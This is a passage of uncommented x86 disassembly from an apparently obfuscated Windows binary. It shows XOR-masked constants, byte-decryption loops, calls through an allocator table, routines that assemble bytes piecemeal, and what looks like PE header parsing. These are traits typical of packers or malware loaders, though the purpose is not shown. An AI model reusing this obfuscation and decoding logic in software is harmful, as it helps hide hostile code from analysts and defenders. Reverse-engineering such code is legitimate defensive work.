  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
